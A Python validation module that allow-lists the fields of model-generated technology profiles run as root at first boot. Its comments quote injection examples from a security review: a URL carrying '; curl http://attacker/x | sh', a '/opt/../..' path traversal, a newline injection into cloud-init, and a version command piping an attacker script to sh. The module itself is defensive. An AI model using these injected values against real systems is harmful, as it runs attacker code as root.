"""What a technology profile may contain, enforced identically in both services.

WHY THIS IS A SHARED MODULE, AND WHY IT IS STRICT.

A technology profile is JSON that becomes commands root runs on a machine at
first boot: a URL root fetches, a directory root unpacks into, a user root
creates, a systemd unit root starts. With AI_MODE=live that JSON is written by a
model. It is, in the most literal sense, remote code execution by design — the
whole feature is "fetch this and run it" — so the only thing separating intended
execution from arbitrary execution is what these rules allow through.

An adversarial review on 2026-08-22 demonstrated three working escapes from the
first version of those rules, which checked string PREFIXES:

  url  = "https://x/y.tgz; curl http://attacker/x | sh"   starts with https://
  dest = "/opt/../.."                                      starts with /opt/
  unit.exec_start = "/bin/true\\nruncmd:\\n  - \\"touch /tmp/pwned\\""

The first two ran as root; the third injected a whole new cloud-init file (the
reviewer demonstrated writing /root/.ssh/authorized_keys). A fully weaponised
profile returned ZERO findings. The renderer's cmd() helper quotes each command
for YAML — it says nothing about the shell, and I mistook one for the other.

So: WHOLE-VALUE ALLOW-LISTS, never prefixes. Every field is matched against a
pattern describing exactly what it may be, and anything else is refused with a
reason. Three locks, because a profile reaching a machine passes three doors:
the API's linter refuses to publish it, the orchestrator refuses to load it, and
the renderer shell-quotes what survives. Any one of those failing alone should
not be enough.
"""

from __future__ import annotations

import re

# https only, no credentials, no query, and no character that means anything to a
# shell. A URL is fetched by root and its contents executed; the host is the only
# variable part that needs expressing, and everything else is attack surface.
URL = re.compile(r"^https://[A-Za-z0-9][A-Za-z0-9.\-]{0,252}(:\d{1,5})?"
                 r"(/[A-Za-z0-9._~\-/%+]*)?$")

# Add-on software lives under /opt, one or more plain path segments deep. `..` is
# impossible by construction rather than by a separate check: a segment may only
# be alphanumerics, dot, dash or underscore, and a bare ".." segment is excluded
# by requiring at least one non-dot character.
DEST = re.compile(r"^/opt/(?!\.\.?$)[A-Za-z0-9._\-]+(?:/(?!\.\.?$)[A-Za-z0-9._\-]+)*$")

# A system account name, as useradd will accept it.
USER = re.compile(r"^[a-z_][a-z0-9_\-]{0,31}$")

# A sha256 digest, lowercase hex, exactly 64 characters.
SHA256 = re.compile(r"^[0-9a-f]{64}$")

# A catalogue technology code. Hyphens are allowed because the catalogue has
# them (oracle-db, service-mesh) — see report_key for why they cannot travel
# into a report key unchanged.
CODE = re.compile(r"^[a-z0-9](?:[a-z0-9._\-]{0,46}[a-z0-9])?$")

# systemd ExecStart: an absolute path plus arguments, on ONE line. It is written
# into a YAML block scalar, so a newline ends the scalar early and injects
# structure into the cloud-config; and it is read by systemd, not a shell, so
# shell metacharacters would not do what a model writing them expects anyway.
EXEC_START = re.compile(r"^/[\x20-\x7E]{0,511}$")

# One line of printable ASCII, for a unit description.
DESCRIPTION = re.compile(r"^[\x20-\x7E]{1,200}$")

# A version command: a program (absolute path or bare name), its arguments, and
# optionally a redirect of stderr — which most of these tools need, because they
# announce their version there. NOT a general shell command.
#
# It runs as root inside the machine's report script, as `RAW=$(...)`. Merging
# generated profiles into that script is a change made today; before it, no
# agent-written value reached it at all, and `version_command = "true; curl
# http://attacker/rk.sh | sh"` would have piped an attacker's script to root at
# the end of boot — after the proof had already decided the machine was healthy.
VERSION_COMMAND = re.compile(
    r"^(?:/[A-Za-z0-9._/\-]+|[A-Za-z0-9._\-]+)"      # the program
    r"(?: +[A-Za-z0-9._=:/\-]+)*"                     # its arguments
    r"(?: +2>&1)?$")                                  # stderr, where versions live

ENV_KEY = re.compile(r"^[A-Z_][A-Z0-9_]{0,63}$")
ENV_VALUE = re.compile(r"^[\x20-\x7E]{0,512}$")

# The only archive format the renderer can unpack. Declared here rather than
# discovered on the machine: a profile pinning a .zip (HashiCorp ships Vault
# that way) would fetch, fail to unpack, and be withdrawn as an uncertifiable
# recipe when the defect is in our renderer. Refusing it up front says which.
ARCHIVE_SUFFIXES = (".tar.gz", ".tgz")


def report_key(code: str) -> str:
    """The identifier form of a technology code, for a `key=value` report line.

    boot_reports.verdict() only parses a line whose key `isidentifier()`, and
    catalogue codes contain hyphens — so `archive_oracle-db=failed` was read as
    healthy and thrown away. Sanitising here keeps the machine's failure legible
    to the one function that judges it.
    """
    return re.sub(r"[^0-9A-Za-z_]", "_", code or "")


def archive_problems(archive: dict, *, declares_services: bool) -> list[str]:
    """Every reason this archive spec may not be handed to a machine.

    Empty means it may. The messages are written for whoever reads a refusal,
    which may be an agent redrafting: each says what was wrong and what shape is
    acceptable.
    """
    problems: list[str] = []
    if not isinstance(archive, dict):
        return ["The archive is not an object."]

    url = archive.get("url")
    if not isinstance(url, str) or not URL.match(url):
        problems.append(
            f"The archive URL {url!r} is not an acceptable https URL. Root fetches "
            f"this address and executes what is there, so it must be https and "
            f"may contain only letters, digits and ._~-/%+ — no spaces, no shell "
            f"characters, no credentials, no query string.")
    elif not url.lower().endswith(ARCHIVE_SUFFIXES):
        problems.append(
            f"The archive URL ends in something other than "
            f"{' or '.join(ARCHIVE_SUFFIXES)}. The renderer unpacks with "
            f"`tar -xzf` and cannot open a zip or an xz archive; pinning one "
            f"would fail on every machine and look like a bad recipe rather than "
            f"an unsupported format.")

    dest = archive.get("dest")
    if not isinstance(dest, str) or not DEST.match(dest):
        problems.append(
            f"The unpack destination {dest!r} is not an acceptable path. It must "
            f"be under /opt with plain path segments; `/opt/../..` reaches the "
            f"base system, and tar would write an attacker-shaped tree over it "
            f"as root.")

    sha = archive.get("sha256")
    if not isinstance(sha, str) or not SHA256.match(sha):
        # A BLOCKER, not a warning. This was a warning for one afternoon, on the
        # reasoning that TLS plus a sandbox bounded it. TLS authenticates the
        # host a profile NAMES; it says nothing about whether that host serves
        # the software the profile claims, and with a model choosing the host
        # that is the entire question. Nothing unverified gets executed by root.
        problems.append(
            f"The archive has no usable sha256 (got {sha!r}). Root executes what "
            f"this fetches, and a checksum is the only thing that says the bytes "
            f"are the ones somebody vouched for — TLS only proves the host is the "
            f"host. Provide a lowercase 64-character digest measured from the "
            f"actual artifact.")

    user = archive.get("user")
    if user is not None and (not isinstance(user, str) or not USER.match(user)):
        problems.append(
            f"The service user {user!r} is not an acceptable account name; it is "
            f"passed to useradd and chown as root.")

    unit = archive.get("unit")
    if unit is None or unit == {}:
        if declares_services:
            problems.append(
                "The profile starts a service but the archive declares no systemd "
                "unit, and no package installs one — enable would fail on a unit "
                "that does not exist.")
    elif not isinstance(unit, dict):
        problems.append(f"The archive unit is {type(unit).__name__}, not an object.")
    else:
        exec_start = unit.get("exec_start")
        if not isinstance(exec_start, str) or not EXEC_START.match(exec_start):
            problems.append(
                f"The unit ExecStart {exec_start!r} is not acceptable: it must be "
                f"a single line of printable ASCII beginning with an absolute "
                f"path. It is written into a YAML block scalar, so a newline ends "
                f"the scalar and injects structure into the machine's whole "
                f"first-boot configuration.")
        description = unit.get("description")
        if description is not None and (not isinstance(description, str)
                                        or not DESCRIPTION.match(description)):
            problems.append("The unit description must be one line of printable ASCII.")
        environment = unit.get("environment")
        if environment is not None:
            if not isinstance(environment, dict):
                problems.append(
                    f"The unit environment is {type(environment).__name__}, not an "
                    f"object of NAME: value pairs.")
            else:
                for key, value in environment.items():
                    if not isinstance(key, str) or not ENV_KEY.match(key):
                        problems.append(f"Environment name {key!r} is not acceptable.")
                    if not isinstance(value, str) or not ENV_VALUE.match(str(value)):
                        problems.append(
                            f"Environment value for {key!r} must be one line of "
                            f"printable ASCII.")
    return problems


def profile_problems(profile: dict) -> list[str]:
    """Every reason this profile may not reach a machine. Empty means it may.

    Used by BOTH services: the API refuses to publish a profile with problems,
    and the orchestrator refuses to load one. A profile that somehow reaches the
    store without passing here is skipped rather than rendered, because the store
    is a directory and a directory is not an authority.
    """
    problems: list[str] = []
    if not isinstance(profile, dict):
        return ["The profile is not an object."]

    code = profile.get("code")
    if not isinstance(code, str) or not CODE.match(code):
        problems.append(
            f"The technology code {code!r} is not acceptable; it becomes a file "
            f"name, a systemd unit name and a key in the machine's own report.")

    families = [f for f in ("rhel", "debian") if isinstance(profile.get(f), dict)]
    if not families:
        problems.append(
            "The profile covers no OS family. Package and service names differ per "
            "family — Apache is `httpd` on Oracle Linux and `apache2` on Ubuntu — "
            "so a profile naming neither cannot install anything.")

    archive = profile.get("archive")
    declares_services = any(profile[f].get("services") for f in families)
    if archive is not None:
        problems += archive_problems(archive, declares_services=declares_services)

    # IT MUST INSTALL SOMETHING RUNNABLE. Relaxing the packages rule for archives
    # briefly allowed a profile with no packages, no services and no ports: it
    # unpacked a tarball, started nothing, and reported healthy — a proof of
    # nothing, which is the failure this whole certification design exists to
    # prevent and which it had already reproduced twice that day.
    installs = any(profile[f].get("packages") for f in families) or archive is not None
    if not installs:
        problems.append("The profile installs nothing: no packages and no archive.")
    if archive is not None and not declares_services:
        problems.append(
            "The profile unpacks an archive but starts nothing. A machine that "
            "installs software and runs none of it reports healthy while doing "
            "nothing, which is exactly what a proof must never certify.")

    for family in families:
        block = profile[family]
        for package in block.get("packages") or []:
            if not isinstance(package, str) or not CODE.match(package):
                problems.append(
                    f"Package name {package!r} on {family} is not acceptable; it "
                    f"is passed to the package manager as root.")
        for service in block.get("services") or []:
            if not isinstance(service, str) or not CODE.match(service):
                problems.append(
                    f"Service name {service!r} on {family} is not acceptable; it "
                    f"is passed to systemctl as root.")

    # The version command runs inside the machine's report script, as root, and
    # its output is compared with `expects`. A command with no expectation is a
    # question nobody reads the answer to — the silence that shipped Redis 6.2
    # under a catalogue entry called "Redis 7".
    command = profile.get("version_command")
    if not isinstance(command, str) or not command.strip():
        problems.append(
            "The profile gives no way to ask the machine what it actually "
            "received. A package called `redis` delivered Redis 6.2 while the "
            "catalogue promised Redis 7, and nothing noticed until somebody "
            "logged in.")
    elif not VERSION_COMMAND.match(command.strip()):
        problems.append(
            f"The version command {command!r} is not acceptable. It runs as root "
            f"inside the machine's own report script as `RAW=$(...)`, so it may "
            f"be a program and its arguments — optionally with `2>&1`, where most "
            f"of these tools announce their version — and nothing else. No "
            f"semicolons, pipes, substitutions or newlines.")
    elif archive is not None and not str(profile.get("expects") or "").strip():
        # REQUIRED ONLY WHEN THE PROFILE PINS A VERSION, which an archive does by
        # naming one release URL — so there is a specific answer and not
        # comparing it is the silence that shipped Redis 6.2 as Redis 7.
        #
        # A package profile is different and must not be caught by this: the OS
        # decides the version, and the shipped nginx template deliberately
        # carries a version_command with NO `expects` because the REQUESTER picks
        # the version and render() supplies it per request. Requiring it here
        # blocked every package guess — the cheap path that costs one sandbox
        # machine to confirm or refute a package name.
        problems.append(
            "The profile pins a specific release but declares no `expects`, so "
            "nothing compares what the machine reports with what was pinned. "
            "Declare the major version that release is.")

    return problems
